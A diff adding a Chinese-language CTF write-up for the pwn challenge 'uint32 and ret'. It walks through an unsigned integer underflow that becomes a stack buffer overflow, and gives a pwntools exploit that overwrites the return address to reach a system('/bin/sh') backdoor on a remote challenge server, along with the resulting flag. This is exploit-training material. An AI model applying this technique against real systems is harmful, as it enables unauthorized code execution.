@@ -3006,6 +3006,82 @@ io.interactive()
 
 ------
 
+### uint32 and ret
+
+先`file ./uint `查看文件类型，再`checksec --file=./uint `检查文件保护情况。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/uint32 and ret]
+└─$ file ./uint
+./uint: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d653cac952aa813e9606cf34e1d680c4c354ee1d, for GNU/Linux 3.2.0, not stripped
+
+┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/uint32 and ret]
+└─$ checksec --file=./uint
+[*] '/home/tyd/ctf/pwn/buuctf/NewStarCTF/uint32 and ret/uint'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+```
+
+用`IDA Pro 64bit`打开附件`uint`，按`F5`反汇编源码并查看主函数。
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  setbuf(stdin, 0LL);
+  setbuf(_bss_start, 0LL);
+  puts("hello world");
+  vuln();
+  return 0;
+}
+```
+
+双击`vuln()`函数查看详情，`read(0, buf, (unsigned int)nbytes)`这行语句可能造成栈溢出漏洞。 
+
+```c
+ssize_t vuln()
+{
+  char buf[72]; // [rsp+0h] [rbp-50h] BYREF
+  int v2; // [rsp+48h] [rbp-8h] BYREF
+  size_t nbytes; // [rsp+4Ch] [rbp-4h]
+
+  LODWORD(nbytes) = 48;
+  v2 = 0;
+  puts("If you can find something is special,you are a half success!");
+  __isoc99_scanf("%u", &v2);
+  LODWORD(nbytes) = nbytes - v2;
+  puts("twice");
+  return read(0, buf, (unsigned int)nbytes);
+}
+```
+
+我们先计算下`payload`需要多少个字符，在`Functions window`中看到`backdoor`函数的返回值是`system("/bin/sh")`，其相应地址为`0x4011be`，构造完的`payload`长度为`0x60`字节。
+
+```python
+from pwn import *
+
+payload = b'a'*(0x50+0x8)+p64(0x4011be)
+print(hex(len(payload))) # 0x60
+```
+
+`LODWORD(nbytes) = 48;`只有`0x30`字节，当用户输入的`v2`使得`0x30-v2`的无符号整型数值不小于`0x60`时就能造成栈溢出漏洞，`scanf`中`%u`是以`unsigned int`型读入正数，所以需要将占`4`字节的小端有符号整数`-48`转换成小端无符号整数`4294967248`，这样程序在执行完`LODWORD(nbytes) = nbytes - v2;`后的`(unsigned int)nbytes`数值就能为`0x60`，从而造成栈溢出漏洞。编写`Python`代码可得`flag{0fb641a6-ff72-4932-a281-2a00a91001e5}`。
+
+```python
+from pwn import *
+
+io = remote('node4.buuoj.cn', 25048)
+io.recvuntil(b'If you can find something is special,you are a half success!\n')
+n = int.from_bytes((-48).to_bytes(4, 'little', signed=True), 'little', signed=False) # 4294967248
+io.sendline(str(n))
+payload = b'a'*(0x50+0x8)+p64(0x4011be)
+io.sendlineafter(b'twice\n', payload)
+io.interactive()
+```
+
+------
+
 ## ADWorld
 
 ### [get_shell](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5049)
